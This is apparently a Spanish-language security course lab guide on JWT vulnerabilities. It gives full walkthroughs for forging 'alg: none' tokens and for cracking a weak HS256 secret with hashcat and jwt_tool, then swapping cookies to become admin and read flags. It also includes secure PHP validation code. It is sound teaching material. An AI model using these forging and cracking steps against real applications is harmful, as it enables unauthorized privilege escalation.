---
title: "Lab - Token JWT (JSON Web Tokens)"
date: "2026-10-08"
author: "Manuel FR"
tags:
  - ifct0109
  - poc
  - vulnerabilidades-web
  - web
  - vulnweb
  - jwt
---

> [[02 - MODULOS/05 - Prácticas (PoCs)|← Volver a Prácticas (PoCs)]] | [[02 - MODULOS/Prácticas (PoCs)/Vulnerabilidades Web/00 - Índice del Módulo Vulnerabilidades Web|Índice del Módulo]]

---
# Lab - Token JWT (JSON Web Tokens)

# 🔐 JWT (JSON Web Tokens) Vulnerabilities

 

## Aprende a explotar y prevenir vulnerabilidades en JWT

 
 
 

## 📚 ¿Qué es JWT?

 

 **JWT (JSON Web Token)** es un estándar abierto (RFC 7519) que define una forma compacta y autónoma de transmitir información de manera segura entre partes como un objeto JSON. Los JWT se usan comúnmente para autenticación y autorización en aplicaciones web modernas.
 
 
 

### 🔍 Estructura de un JWT

 

Un JWT consta de tres partes separadas por puntos (.)
 
 
 
 **1. Header (Encabezado)**

 Contiene el tipo de token (JWT) y el algoritmo de firma (HS256, RS256, none, etc.)
 
{

 "typ": "JWT",

 "alg": "HS256"

}
 
 
 
 
 **2. Payload (Carga útil)**

 Contiene las "claims" (afirmaciones) - información sobre el usuario
 
{

 "sub": "1234567890",

 "name": "John Doe",

 "role": "user",

 "iat": 1516239022

}
 
 
 
 
 **3. Signature (Firma)**

 Asegura que el token no ha sido alterado
 
HMACSHA256(

 base64UrlEncode(header) + "." +

 base64UrlEncode(payload),

 secret

)
 
 
 

 

**Ejemplo de JWT completo:**
 
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6InVzZXIifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
 

 

> [!note]
> 
 **💡 Importante:** JWT es solo codificado en Base64URL, NO encriptado. Cualquiera puede decodificar y leer el contenido. La firma es lo que garantiza la integridad, no la confidencialidad.
> 

 

### 🎯 ¿Cómo se usa JWT en autenticación?

 

 
1. **Login:** Usuario envía credenciales al servidor
 
2. **Generación:** Servidor valida y crea un JWT firmado
 
3. **Respuesta:** Servidor devuelve el JWT al cliente
 
4. **Almacenamiento:** Cliente guarda el JWT (cookie, localStorage)
 
5. **Peticiones:** Cliente envía JWT en cada petición (header Authorization)
 
6. **Validación:** Servidor verifica la firma del JWT
 
7. **Autorización:** Si es válido, servidor procesa la petición
 

 

### 🔥 Vulnerabilidades Comunes en JWT

 

 
* **Algoritmo "none":** JWT sin firma - puede ser modificado libremente
 
* **Weak Secret:** Clave débil que puede ser crackeada por fuerza bruta
 
* **Key Confusion (RS256 → HS256):** Confundir clave pública con secreta
 
* **Sin validación de firma:** Servidor acepta JWT sin verificar
 
* **Inyección en JWT:** SQL injection, XSS en claims del JWT
 
* **Token en URL:** JWT expuesto en logs, historial del navegador
 
* **Sin expiración:** Tokens que nunca expiran
 
* **Information Disclosure:** Datos sensibles en payload visible
 

 

### 🛠️ Herramientas para Trabajar con JWT

 
 

#### Herramientas Web:

 

 
* JWT.io - Decodificador y verificador oficial de JWT, muy completo
 
* Token.dev - Debugger completo para JWT, JWE, JWK
 
* JWT JS Decode - Decodificador simple y rápido
 

 

#### Herramientas de Línea de Comandos:

 

 
* **jwt_tool:** `python3 jwt_tool.py [JWT]` - Herramienta completa de pentesting
 
* **hashcat:** `hashcat -m 16500 jwt.txt wordlist.txt` - Cracking de secrets
 
* **John the Ripper:** `john jwt.txt --wordlist=rockyou.txt` - Alternative para cracking
 

 

#### Extensiones de Burp Suite:

 

 
* **JWT Editor:** Editor completo de JWT en Burp
 
* **JSON Web Token Attacker:** Automatiza ataques comunes
 

 

 

### 🛡️ Mejores Prácticas de Seguridad

 

 
* **Usar algoritmos fuertes:** HS256, RS256, ES256 (nunca "none")
 
* **Secretos robustos:** Claves aleatorias de 256+ bits
 
* **Validar SIEMPRE la firma:** No confiar en el JWT sin verificar
 
* **Validar el algoritmo:** Rechazar "none" y verificar el esperado
 
* **Usar expiración:** Claims "exp" (expiration) e "iat" (issued at)
 
* **No datos sensibles:** Nunca poner contraseñas, SSN en el payload
 
* **HTTPS obligatorio:** Transmitir JWT solo por conexiones seguras
 
* **Refresh tokens:** JWT de corta duración + refresh token seguro
 
* **Revocación:** Lista negra o whitelist de tokens válidos
 
* **Validar claims:** Verificar "aud", "iss", "sub" según contexto
 

 

 
 
 

## 🧪 Laboratorios Prácticos

 

Completa estos laboratorios para dominar las vulnerabilidades de JWT:

 
 
 
 

### Lab 1: JWT Algorithm "none" - Sin Firma

 FÁCIL
 
 
 

 Sistema de autenticación que acepta JWT con algoritmo "none", lo que significa que no valida la firma del token. Un atacante puede modificar libremente el payload (usuario, rol, permisos) sin necesidad de conocer ninguna clave secreta.
 
 
 
 **🎯 Objetivo:** Loguéate como usuario normal, modifica el JWT para cambiar tu rol a "admin" sin firma, y accede al panel de administración para obtener la FLAG.
 
 
 
 🚀 Acceder al Laboratorio
 
 
 
 
 
 💡 Ver Solución Completa
 ▼
 
 
 

#### 📚 Entendiendo la Vulnerabilidad

 

 El algoritmo "none" es una opción del estándar JWT que indica que el token no tiene firma.
 
 
 

> [!note]
> 
 **💡 ¿Por qué es vulnerable?**
> 
 Si un servidor acepta JWT con algoritmo "none", un atacante puede crear o modificar cualquier JWT cambiando el header a {"alg":"none","typ":"JWT"}, modificando el payload a voluntad, y el servidor lo aceptará sin verificar nada.
> 

 

#### Solución Paso a Paso:

 

#### 🔐 Paso 1: Hacer Login

 
1. Accede a lab1.php

2. Usa las credenciales: user / user123

3. Click en "🔐 Iniciar Sesión"
 
 
 

**Resultado esperado:**
 

 
* Login exitoso como "user"
 
* Ves tu panel con rol: "user"
 
* No tienes acceso al panel de admin
 

 

#### 🔍 Paso 2: Obtener el JWT

 

El JWT está almacenado en una cookie llamada "auth_token". Hay varias formas de obtenerlo:
 
 

**Método 1: Desde el laboratorio**
 
El JWT se muestra directamente en el panel de usuario

Copia el token completo (tres partes separadas por puntos)
 
 
 

**Método 2: DevTools del navegador**
 
1. Presiona F12 (abrir DevTools)

2. Ve a la pestaña "Application" o "Almacenamiento"

3. En el menú lateral: Cookies → http://localhost

4. Busca la cookie "auth_token"

5. Copia su valor
 

 

**Método 3: Burp Suite**
 
1. Intercepta la petición en Burp Suite

2. Busca el header: Cookie: auth_token=...

3. Copia el valor del JWT
 

 

**JWT obtenido (ejemplo):**
 
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciIsImV4cCI6MTczODM1MTIwMH0.
 

 

#### 🧪 Paso 3: Decodificar el JWT

 

Usa una de las herramientas web para decodificar:
 
 

**Opción 1: JWT.io (Recomendado)**
 
1. Abre https://www.jwt.io/

2. Pega tu JWT en el campo "Encoded"

3. Observa las tres secciones decodificadas:

 - Header

 - Payload

 - Signature
 

 

**Opción 2: Token.dev**
 
1. Abre https://token.dev/

2. Pega tu JWT en el campo principal

3. Ve toda la información decodificada
 

 

**Opción 3: JWT JS Decode**
 
1. Abre https://irrte.ch/jwt-js-decode/index.html

2. Pega tu JWT

3. Ve el header y payload decodificados
 

 

**Header decodificado:**
 
{

 "typ": "JWT",

 "alg": "none" ← VULNERABILIDAD: sin firma

}
 

 

**Payload decodificado:**
 
{

 "username": "user",

 "role": "user", ← Queremos cambiar esto a "admin"

 "exp": 1738351200

}
 

 

#### ✏️ Paso 4: Modificar el Payload

 

Ahora vamos a crear un JWT malicioso con rol "admin":

 

**En JWT.io:**
 
1. En la sección "Decoded" → "PAYLOAD"

2. Cambia "role": "user" → "role": "admin"

3. Verifica que el header tenga "alg": "none"

4. El JWT modificado aparece en "Encoded"
 

 

**En Token.dev:**
 
1. Click en "Edit" en el payload

2. Modifica el campo "role" a "admin"

3. El token se actualiza automáticamente
 

 

**JWT malicioso generado:**
 
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MzgzNTEyMDB9.
 

 

> [!note]
> 
 **🔍 Observa:** El JWT termina con un punto (.) porque no hay firma. Las tres partes son: Header.Payload.(vacío)
> 			**En el caso de que la aplicación elimine el punto hay que añadirlo**
> 

 

#### 🔄 Paso 5: Reemplazar el JWT

 

Ahora necesitas reemplazar el JWT original con el malicioso:

 

**Método 1: DevTools (Más fácil)**
 
1. F12 → Application/Almacenamiento → Cookies

2. Click en la cookie "auth_token"

3. En el campo "Value", pega el JWT malicioso

4. Presiona Enter

5. Recarga la página (F5)
 

 

**Método 2: Burp Suite**
 
1. Intercepta la petición

2. Encuentra: Cookie: auth_token=[JWT_ORIGINAL]

3. Reemplaza con: Cookie: auth_token=[JWT_MALICIOSO]

4. Forward
 

 

**Método 3: Console de JavaScript**
 
1. F12 → Console

2. Ejecuta:

 document.cookie = "auth_token=TU_JWT_MALICIOSO; path=/"

3. Recarga la página
 

 

#### ✅ Paso 6: Verificar Escalada de Privilegios

 
1. Recarga la página (F5)

2. Observa el panel de usuario:

 - Usuario: user

 - Rol: admin ← ¡Escalada exitosa!

3. Aparece el "PANEL DE ADMINISTRADOR"
 

 

#### 🚩 Paso 7: Obtener la FLAG

 

Si todo fue exitoso, verás:
 
👑 PANEL DE ADMINISTRADOR

¡Felicidades! Has escalado privilegios correctamente

🚩 FLAG: FLAG{JWT_N0N3_4LG0R1THM_BYP4SS}
 

 

#### 📊 Diagrama del Ataque:

 
┌──────────────────────────────────────────┐

│ 1. LOGIN NORMAL │

│ user / user123 │

└────────────┬─────────────────────────────┘

 │

 ▼

┌──────────────────────────────────────────┐

│ 2. SERVIDOR GENERA JWT │

│ Header: {"alg":"none","typ":"JWT"} │

│ Payload: {"username":"user", │

│ "role":"user"} │

│ Signature: (ninguna) │

└────────────┬─────────────────────────────┘

 │

 ▼

┌──────────────────────────────────────────┐

│ 3. ATACANTE MODIFICA JWT │

│ ✓ Copia JWT de cookie │

│ ✓ Decodifica con JWT.io │

│ ✓ Cambia "role":"user" → "admin" │

│ ✓ Re-codifica (sin firma necesaria) │

└────────────┬─────────────────────────────┘

 │

 ▼

┌──────────────────────────────────────────┐

│ 4. ATACANTE REEMPLAZA COOKIE │

│ DevTools → Cookies → auth_token │

│ = JWT_MALICIOSO │

└────────────┬─────────────────────────────┘

 │

 ▼

┌──────────────────────────────────────────┐

│ 5. SERVIDOR VALIDA │

│ ✓ Header: alg = "none" → OK │

│ ✓ No verifica firma (alg=none) │

│ ✓ Lee payload: role = "admin" │

│ ✓ Concede acceso administrativo │

└────────────┬─────────────────────────────┘

 │

 ▼

┌──────────────────────────────────────────┐

│ 6. ACCESO ADMIN + FLAG │

│ FLAG{JWT_N0N3_4LG0R1THM_BYP4SS} │

└──────────────────────────────────────────┘
 

 

#### 🎓 Variantes del Ataque:

 

**1. Modificar otros campos:**
 
{

 "username": "user", → "admin"

 "role": "user", → "superadmin"

 "permissions": ["read"], → ["read","write","delete"]

 "exp": 1738351200 → 9999999999 (nunca expira)

}
 

 

**2. Crear JWT completamente nuevo:**
 
Header: {"alg":"none","typ":"JWT"}

Payload: {"username":"hacker","role":"admin","god_mode":true}

Signature: (vacío)
 

 

**3. Usar jwt_tool (línea de comandos):**
 
# Modificar JWT automáticamente

python3 jwt_tool.py [JWT] -X a

# Seleccionar ataque "none algorithm"

# La herramienta genera JWT sin firma automáticamente
 

 

#### Conceptos Clave Aprendidos:

 

 
* **JWT estructura:** Header.Payload.Signature (tres partes)
 
* **Base64URL:** Codificación reversible, NO encriptación
 
* **Algoritmo "none":** Sin firma = sin seguridad
 
* **Claims:** Información dentro del payload (role, username, exp)
 
* **Modificación libre:** Si alg=none, puedes cambiar todo
 
* **Cookies:** Lugar común donde se almacena el JWT
 

 

#### Prevención - Código Seguro:

 

**NUNCA aceptar algoritmo "none":**
 
function validate_jwt($jwt, $secret) {

 $parts = explode('.', $jwt);

 $header = json_decode(base64url_decode($parts[0]), true);

 

 // RECHAZAR algoritmo "none"

 if (!isset($header['alg']) || 

 strtolower($header['alg']) === 'none') {

 throw new Exception("Algoritmo 'none' no permitido");

 }

 

 // Validar algoritmo esperado

 if ($header['alg'] !== 'HS256') {

 throw new Exception("Algoritmo no soportado");

 }

 

 // Verificar firma

 $signature = hash_hmac('sha256', 

 $parts[0]. '.'. $parts[1], 

 $secret, true);

 

 $expected = base64url_encode($signature);

 

 if (!hash_equals($parts[2], $expected)) {

 throw new Exception("Firma inválida");

 }

 

 return json_decode(base64url_decode($parts[1]), true);

}
 

 

**Medidas de seguridad adicionales:**
 

 
* Whitelist de algoritmos permitidos (solo HS256, RS256, etc.)
 
* Validar SIEMPRE la firma antes de confiar en el payload
 
* Usar librerías JWT confiables que ya rechazan "none"
 
* Implementar expiración (claim "exp") y verificarla
 
* Usar secretos robustos (256+ bits aleatorios)
 
* No confiar en el header "alg" sin validarlo
 
* Logs de intentos de uso de "none"
 

 

#### 📋 Checklist del Ataque:

 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

| Paso | Acción | Verificación |
| --- | --- | --- |
| 1 | Login como user | Sesión activa, rol: user |
| 2 | Obtener JWT de cookie | Tres partes separadas por puntos |
| 3 | Decodificar en JWT.io | Ver header: alg=none, payload: role=user |
| 4 | Modificar role a admin | JWT actualizado automáticamente |
| 5 | Copiar JWT malicioso | Termina con punto (.) |
| 6 | Reemplazar cookie | DevTools → auth_token modificado |
| 7 | Recargar página | Panel muestra role: admin |
| 8 | Acceder panel admin | FLAG visible |

 

> [!note]
> 
 **⚠️ Lección Principal:** El algoritmo "none" NUNCA debe usarse en producción. Siempre valida que el algoritmo sea uno seguro (HS256, RS256) y rechaza explícitamente "none". La firma es la única garantía de que el JWT no ha sido manipulado.
> 

 
 
 

 
 
 
 

### Lab 2: JWT Weak Secret - Brute Force

 MEDIO
 
 
 

 Sistema que usa JWT con algoritmo HMAC256 para firmar los tokens, pero utiliza una clave secreta extremadamente débil y común. Un atacante puede realizar un ataque de fuerza bruta para descubrir la clave, modificar el JWT, y re-firmarlo correctamente.
 
 
 
 **🎯 Objetivo:** Loguéate como usuario normal, obtén el JWT, usa herramientas de cracking (hashcat, jwt_tool) para descubrir la clave secreta débil, modifica el rol a "admin", re-firma el token con la clave descubierta, y accede al panel de administración.
 
 
 
 🚀 Acceder al Laboratorio
 
 
 
 
 
 💡 Ver Solución Completa
 ▼
 
 
 

#### 📚 Entendiendo la Vulnerabilidad

 

 A diferencia del Lab 1, este sistema SÍ utiliza una firma HMAC256 para proteger los JWT. Sin embargo, la clave secreta usada para firmar es extremadamente débil (una palabra común del diccionario). Esto permite que un atacante use herramientas de fuerza bruta para descubrir la clave y luego crear JWT válidos a voluntad.
 
 
 

> [!note]
> 
 **💡 ¿Por qué es vulnerable?**
> 
 HMAC256 es un algoritmo seguro, pero su seguridad depende completamente de la fortaleza de la clave secreta. Si la clave es débil (palabra del diccionario, corta, predecible), puede ser crackeada en segundos con herramientas modernas.
> 

 

#### Solución Paso a Paso:

 

#### 🔐 Paso 1: Hacer Login

 
1. Accede a lab2.php

2. Usa las credenciales: john / password123

3. Click en "🔐 Iniciar Sesión"
 
 
 

**Resultado esperado:**
 

 
* Login exitoso como "john"
 
* Panel de usuario con rol: "user"
 
* JWT visible en el panel
 

 

#### 🔍 Paso 2: Obtener y Analizar el JWT

 

Copia el JWT mostrado en el panel o desde las cookies:
 
 
Ejemplo de JWT obtenido:

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImpvaG4iLCJyb2xlIjoidXNlciIsImlhdCI6MTczODM1MTIwMCwiZXhwIjoxNzM4MzU0ODAwfQ.7X8YbKT3vQ4H_k9WOlB3pJm5YqN1rF2dU8zL6wA4cMo
 

 

**Decodifica el JWT en JWT.io:**
 
 

Header:
 
{

 "alg": "HS256", ← HMAC SHA-256 (requiere clave)

 "typ": "JWT"

}
 

 

Payload:
 
{

 "username": "john",

 "role": "user",

 "iat": 1738351200,

 "exp": 1738354800

}
 

 

> [!note]
> 
 **🔍 Observa:** El JWT está firmado con HS256. Si intentas modificarlo sin la clave correcta, la firma será inválida y el servidor lo rechazará. Necesitas descubrir la clave primero.
> 

 

#### 💥 Paso 3: Crackear el Secret con Herramientas

 
 

**Opción 1: Usando hashcat (Más rápido)**
 
 

Hashcat es una herramienta extremadamente rápida para cracking:
 
 
# 1. Guarda el JWT en un archivo

echo "TU_JWT_AQUI" > jwt.txt

# 2. Descarga una wordlist (rockyou es la más común)

wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# 3. Ejecuta hashcat

hashcat -a 0 -m 16500 jwt.txt rockyou.txt

# -a 0: Ataque de diccionario

# -m 16500: Modo JWT (HS256, HS384, HS512)

# jwt.txt: Archivo con el JWT

# rockyou.txt: Diccionario de contraseñas
 

 

**Salida esperada de hashcat:**
 
hashcat (v6.2.5) starting...

[...procesando...]

eyJhbGci...cMo:secret

Session..........: hashcat

Status...........: Cracked

Started: Fri Jan 30 12:00:00 2026

Stopped: Fri Jan 30 12:00:03 2026
 

 

**🎉 Secret descubierto: `secret`**

 

**Opción 2: Usando jwt_tool**
 
# 1. Instala jwt_tool

git clone https://github.com/ticarpi/jwt_tool

cd jwt_tool

# 2. Crea una wordlist simple (para testing)

echo -e "password\nadmin\nsecret\n123456" > wordlist.txt

# 3. Ejecuta el ataque de cracking

python3 jwt_tool.py [TU_JWT] -C -d wordlist.txt

# -C: Modo cracking

# -d: Diccionario personalizado
 

 

**Salida esperada de jwt_tool:**
 
[*] Loaded 4 passwords from wordlist

[*] Testing passwords...

[+] secret is the CORRECT key!

You can use this key to forge new tokens.
 

 

**Opción 3: Wordlist personalizada**
 

Si sabes que la clave es muy débil, puedes crear una wordlist pequeña:
 
# Crear wordlist con las 100 contraseñas más comunes

cat > common.txt << EOF

password

123456

secret

admin

12345

password123

qwerty

letmein

EOF

# Probar con hashcat

hashcat -a 0 -m 16500 jwt.txt common.txt
 

 

#### ✏️ Paso 4: Modificar el JWT

 

Ahora que conoces el secret (`secret`), puedes modificar y re-firmar el JWT:

 

**Método 1: irrte.ch (Más visual)**
 
1. Abre https://irrte.ch/jwt-js-decode/index.html

2. Pega tu JWT original en "Encoded"

3. En la sección "PAYLOAD", cambia:

 "role": "user" → "role": "admin"

4. En la sección "Signature":

 Cambia Your-HMAC-secret por: secret

5. Pulsa resign

6. Copia el nuevo JWT de "Encoded"
 

 

**Método 2: Token.dev**
 
1. Abre https://token.dev/

2. Pega el JWT

3. Click en "Edit" en el payload

4. Cambia "role" a "admin"

5. En "Secret", pon: secret

6. Click en "Sign"

7. Copia el JWT firmado
 

 

**Método 3: jwt_tool (Línea de comandos)**
 
# Modificar y re-firmar automáticamente

python3 jwt_tool.py [JWT_ORIGINAL] -T -S hs256 -p "secret"

# -T: Modo tamper (modificar)

# -S hs256: Algoritmo de firma

# -p "secret": Clave secreta

# La herramienta te permitirá modificar campos
 

 

**JWT malicioso generado:**
 
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImpvaG4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MzgzNTEyMDAsImV4cCI6MTczODM1NDgwMH0.NEW_SIGNATURE_HERE
 

 

> [!note]
> 
 **🔍 Observa:** La firma (tercera parte) es diferente porque modificamos el payload. Pero como conocemos el secret, pudimos calcular la nueva firma correcta.
> 

 

#### 🔄 Paso 5: Reemplazar el JWT

 

Igual que en Lab 1, reemplaza la cookie con el JWT malicioso:
 
 
F12 → Application → Cookies → auth_token

Pega el JWT modificado

Recarga la página (F5)
 

 

#### ✅ Paso 6: Verificar Escalada de Privilegios

 
Observa:

- Usuario: john

- Rol: admin ← ¡Escalada exitosa!

- Aparece el panel de administrador
 

 

#### 🚩 Paso 7: Obtener la FLAG

 
👑 PANEL DE ADMINISTRADOR

¡Excelente! Has crackeado la clave y re-firmado el JWT

🚩 FLAG: FLAG{JWT_W34K_S3CR3T_CR4CK3D}

La clave era: secret
 

 

#### 📊 Diagrama del Ataque:

 
┌──────────────────────────────────────────┐

│ 1. LOGIN → OBTENER JWT │

│ john / password123 │

│ JWT: [Header].[Payload].[Signature] │

└────────────┬─────────────────────────────┘

 │

 ▼

┌──────────────────────────────────────────┐

│ 2. ANALIZAR JWT │

│ Decodificar en JWT.io │

│ Header: alg=HS256 (firmado) │

│ Payload: role=user │

│ Signature: [hash válido] │

└────────────┬─────────────────────────────┘

 │

 ▼

┌──────────────────────────────────────────┐

│ 3. CRACKEAR SECRET │

│ hashcat -m 16500 jwt.txt rockyou.txt │

│ Probando: password, admin, secret... │

│ ✅ ENCONTRADO: secret │

└────────────┬─────────────────────────────┘

 │

 ▼

┌──────────────────────────────────────────┐

│ 4. MODIFICAR PAYLOAD │

│ role: user → admin │

│ username: john (igual) │

└────────────┬─────────────────────────────┘

 │

 ▼

┌──────────────────────────────────────────┐

│ 5. RE-FIRMAR JWT │

│ HMAC256(Header.Payload, "secret") │

│ Nueva firma válida generada │

└────────────┬─────────────────────────────┘

 │

 ▼

┌──────────────────────────────────────────┐

│ 6. REEMPLAZAR COOKIE + RECARGAR │

│ auth_token = JWT_MALICIOSO │

└────────────┬─────────────────────────────┘

 │

 ▼

┌──────────────────────────────────────────┐

│ 7. SERVIDOR VALIDA │

│ ✓ Algoritmo: HS256 correcto │

│ ✓ Firma: válida (secret correcto) │

│ ✓ Payload: role=admin │

│ ✓ Concede acceso administrativo │

└────────────┬─────────────────────────────┘

 │

 ▼

┌──────────────────────────────────────────┐

│ 8. ACCESO ADMIN + FLAG │

│ FLAG{JWT_W34K_S3CR3T_CR4CK3D} │

└──────────────────────────────────────────┘
 

 

#### 🎓 Variantes y Técnicas Avanzadas:

 

**1. Wordlists comunes para JWT:**
 
# Secrets típicos en aplicaciones reales:

secret

your-256-bit-secret

mysecret

jwt-secret

secretkey

default-secret

password

admin

123456

qwerty
 

 

**2. Cracking con GPU (hashcat optimizado):**
 
# Usar GPU para cracking ultra-rápido

hashcat -a 0 -m 16500 jwt.txt rockyou.txt -w 4 -O

# -w 4: Workload máximo

# -O: Optimizaciones de kernel

# Con GPU puede probar millones de claves por segundo
 

 

**3. Ataque híbrido (wordlist + mutaciones):**
 
# Probar variaciones: Secret, SECRET, secret123, etc.

hashcat -a 6 -m 16500 jwt.txt wordlist.txt?d?d?d

# Prueba: secret000, secret001,..., secret999
 

 

#### Conceptos Clave Aprendidos:

 

 
* **HMAC256:** Algoritmo seguro si la clave es fuerte
 
* **Brute force:** Ataque de fuerza bruta contra secrets débiles
 
* **Wordlists:** Diccionarios de contraseñas comunes
 
* **hashcat:** Herramienta profesional de cracking
 
* **Re-firma:** Generar nueva firma con el secret descubierto
 
* **Entropía:** Importancia de claves aleatorias y largas
 

 

#### Prevención - Código Seguro:

 

**Generar secret robusto:**
 
// ❌ MAL - Clave débil

$secret = 'secret';

$secret = 'password123';

$secret = 'my-app-secret';

// ✅ BIEN - Clave aleatoria robusta

$secret = bin2hex(random_bytes(32)); // 64 caracteres hex

// Resultado: "a7f3c2b8e1d4f9a6c3e5b7d2f8a1c4e6..."

// Guardar en variable de entorno

$secret = $_ENV['JWT_SECRET'];

// O archivo de configuración seguro

$secret = require __DIR__. '/config/jwt_secret.php';
 

 

**Configuración segura completa:**
 
// Generar secret UNA VEZ y guardarlo

// generate_secret.php

$secret = bin2hex(random_bytes(32));

file_put_contents('.env', "JWT_SECRET=$secret\n", FILE_APPEND);

echo "Secret generado y guardado en.env\n";

// Usar en la aplicación

// config.php

$dotenv = Dotenv\Dotenv::createImmutable(__DIR__);

$dotenv->load();

define('JWT_SECRET', $_ENV['JWT_SECRET']);

define('JWT_ALGORITHM', 'HS256');

define('JWT_EXPIRATION', 3600); // 1 hora
 

 

**Medidas de seguridad adicionales:**
 

 
* Secret de 256+ bits (64+ caracteres hexadecimales)
 
* Generar con `random_bytes()` o equivalente criptográfico
 
* NUNCA hardcodear el secret en el código
 
* Usar variables de entorno o gestores de secretos
 
* Rotar secrets periódicamente
 
* Diferentes secrets para dev/staging/production
 
* Monitorear intentos de tokens inválidos
 
* Rate limiting en endpoints de autenticación
 
* Logs de cracking attempts detectados
 

 

#### 📋 Checklist del Ataque:

 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

| Paso | Acción | Herramienta | Resultado |
| --- | --- | --- | --- |
| 1 | Login normal | Navegador | JWT obtenido |
| 2 | Analizar JWT | JWT.io | alg=HS256, role=user |
| 3 | Crackear secret | hashcat/jwt_tool | Secret: "secret" |
| 4 | Modificar payload | JWT.io | role=admin |
| 5 | Re-firmar JWT | JWT.io + secret | Firma válida |
| 6 | Reemplazar cookie | DevTools | JWT malicioso activo |
| 7 | Recargar página | Navegador | Acceso admin |
| 8 | Obtener FLAG | - | FLAG{...} |

 

> [!note]
> 
 **⚠️ Lección Principal:** Un algoritmo de firma robusto como HS256 es inútil si la clave secreta es débil. Siempre usa claves aleatorias de 256+ bits generadas criptográficamente. Una clave débil puede ser crackeada en segundos, convirtiendo un sistema "seguro" en completamente vulnerable.
> 

 
 
 

 

> [!note]
> 
 
> 
 💡 **Próximamente:** Más laboratorios de JWT con técnicas avanzadas de explotación
> 
>

---

> [[02 - MODULOS/05 - Prácticas (PoCs)|← Volver a Prácticas (PoCs)]] | [[02 - MODULOS/Prácticas (PoCs)/Vulnerabilidades Web/00 - Índice del Módulo Vulnerabilidades Web|Índice del Módulo]]
